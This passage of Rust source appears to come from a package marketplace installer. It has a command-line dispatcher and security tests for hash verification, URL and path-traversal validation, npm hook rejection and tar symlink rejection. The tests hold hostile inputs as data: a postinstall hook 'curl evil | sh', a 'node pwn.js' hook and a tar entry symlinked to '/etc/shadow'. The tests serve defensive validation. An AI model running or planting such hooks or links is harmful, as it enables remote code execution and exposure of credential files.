        println!("{HELP}");
        return Ok(());
    }
    let [params @ .., flag, path] = args else {
        return Err(HELP.into());
    };
    if flag != "--config" {
        return Err(HELP.into());
    }
    let params: Vec<&str> = params
        .iter()
        .map(|a| a.to_str().ok_or(HELP))
        .collect::<Result<Vec<_>, _>>()?;
    let config = Path::new(path);
    let mgr = MarketplaceManager::new();
    let result = match params.as_slice() {
        ["list"] | ["status"] => mgr.state(config)?,
        ["recipes"] => json!({"recipes": mgr.state(config)?["recipes"]}),
        ["recover"] => {
            let recovered = reconcile_interrupted_inactive(config, &BTreeSet::new())?;
            json!({"recovered": recovered})
        }
        ["uninstall", id] => uninstall(config, id)?,
        ["configure", id, rest @ ..] => {
            let mut families = None;
            let mut enabled = None;
            let mut i = 0usize;
            while i < rest.len() {
                match rest[i] {
                    "--families" if i + 1 < rest.len() => {
                        families = Some(rest[i + 1]);
                        i += 2;
                    }
                    "--enable" => {
                        enabled = Some(true);
                        i += 1;
                    }
                    "--disable" => {
                        enabled = Some(false);
                        i += 1;
                    }
                    _ => return Err(HELP.into()),
                }
            }
            configure(config, id, families, enabled)?
        }
        [op @ ("install" | "update"), id, rest @ ..] => {
            let mut req = InstallRequest {
                id: (*id).to_owned(),
                update: *op == "update",
                ..Default::default()
            };
            let mut i = 0usize;
            while i < rest.len() {
                match rest[i] {
                    "--version" if i + 1 < rest.len() => {
                        req.version = Some(rest[i + 1].to_owned());
                        i += 2;
                    }
                    "--url" if i + 1 < rest.len() => {
                        req.url = Some(rest[i + 1].to_owned());
                        i += 2;
                    }
                    "--sha256" if i + 1 < rest.len() => {
                        req.sha256 = Some(rest[i + 1].to_owned());
                        i += 2;
                    }
                    "--sha512" if i + 1 < rest.len() => {
                        req.sha512 = Some(rest[i + 1].to_owned());
                        i += 2;
                    }
                    "--registry" if i + 1 < rest.len() => {
                        req.registry_url = Some(rest[i + 1].to_owned());
                        i += 2;
                    }
                    "--families" if i + 1 < rest.len() => {
                        req.tool_families = Some(rest[i + 1].to_owned());
                        i += 2;
                    }
                    "--member" if i + 1 < rest.len() => {
                        req.binary_member = Some(rest[i + 1].to_owned());
                        i += 2;
                    }
                    "--entrypoint" if i + 1 < rest.len() => {
                        req.entrypoint = Some(rest[i + 1].to_owned());
                        i += 2;
                    }
                    "--type" if i + 1 < rest.len() => {
                        req.kind = Some(rest[i + 1].to_owned());
                        i += 2;
                    }
                    _ => return Err(HELP.into()),
                }
            }
            let cancelled = AtomicBool::new(false);
            let child_pid = AtomicI32::new(0);
            let bytes = AtomicU64::new(0);
            let total = AtomicU64::new(0);
            execute_install(
                config,
                &new_op_id()?,
                &req,
                None,
                &cancelled,
                &child_pid,
                &bytes,
                &total,
            )?
        }
        _ => return Err(HELP.into()),
    };
    println!("{result}");
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn base64_and_sha512_sri_verification() {
        let data = b"veyl-verified-payload";
        let digest = Sha512::digest(data);
        // Encode digest with base64 in test to verify round-trip
        const TBL: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        let mut s = String::new();
        for c in digest.chunks(3) {
            let b0 = c[0] as usize;
            let b1 = *c.get(1).unwrap_or(&0) as usize;
            let b2 = *c.get(2).unwrap_or(&0) as usize;
            s.push(TBL[b0 >> 2] as char);
            s.push(TBL[((b0 & 3) << 4) | (b1 >> 4)] as char);
            s.push(if c.len() > 1 {
                TBL[((b1 & 15) << 2) | (b2 >> 6)] as char
            } else {
                '='
            });
            s.push(if c.len() > 2 {
                TBL[b2 & 63] as char
            } else {
                '='
            });
        }
        assert!(verify_sha512_sri(data, &format!("sha512-{s}")).is_ok());
        assert!(verify_sha512_sri(b"tampered", &format!("sha512-{s}")).is_err());
    }

    #[test]
    fn reject_url_and_path_traversal_vectors() {
        assert!(validate_download_url("http://example.com/pkg.tgz").is_err());
        assert!(validate_download_url("http://localhost:8080/pkg.tgz").is_err());
        assert!(
            validate_download_url("https://registry.npmjs.org/rea-agents/-/rea-agents-6.10.1.tgz")
                .is_ok()
        );
        assert!(validate_download_url("http://127.0.0.1:9001/pkg.tgz").is_ok());

        assert!(validate_rel_path("../etc/passwd", None).is_err());
        assert!(validate_rel_path("/etc/passwd", None).is_err());
        assert!(validate_rel_path("package/../../evil", Some("package")).is_err());
        assert!(validate_rel_path("a\\b", None).is_err());
        assert_eq!(
            validate_rel_path("package/dist/index.js", Some("package")).unwrap(),
            Some(PathBuf::from("dist/index.js"))
        );
    }

    #[test]
    fn npm_lifecycle_hooks_rejected() {
        assert!(check_npm_no_hooks(&json!({"scripts": {"build": "tsc"}})).is_ok());
        assert!(
            check_npm_no_hooks(&json!({"scripts": {"postinstall": "curl evil | sh"}})).is_err()
        );
        assert!(check_npm_no_hooks(&json!({"scripts": {"preinstall": "node pwn.js"}})).is_err());
        assert!(check_npm_no_hooks(&json!({"gypfile": true})).is_err());
    }

    #[test]
    fn tar_rejects_symlinks_and_hardlinks() {
        let mut tar = vec![0u8; 1024];
        tar[0..4].copy_from_slice(b"evil");
        tar[100..107].copy_from_slice(b"0000777");
        tar[108..115].copy_from_slice(b"0000000");
        tar[116..123].copy_from_slice(b"0000000");
        tar[124..135].copy_from_slice(b"00000000000");
        tar[136..147].copy_from_slice(b"00000000000");
        tar[156] = b'2'; // symlink!
        tar[157..168].copy_from_slice(b"/etc/shadow");
        let sum: usize = tar[0..512].iter().enumerate().fold(0, |a, (i, &b)| {
            a + if (148..156).contains(&i) {
                b' ' as usize
            } else {
                b as usize
            }
        });
        let chk = format!("{sum:06o}\0 ");
        tar[148..156].copy_from_slice(chk.as_bytes());

        let tmp = std::env::temp_dir().join(format!("veyl-tar-test-{}", std::process::id()));
        let _ = fs::remove_dir_all(&tmp);
        fs::create_dir(&tmp).unwrap();
        let fd = open_absolute_dir(&tmp).unwrap();
        let mut budget = ExtractBudget { files: 0, bytes: 0 };
        let res = extract_tar_bytes_to_dir(&tar, &fd, None, &mut budget, true);
        let _ = fs::remove_dir_all(&tmp);
        assert!(res.is_err());
    }
}
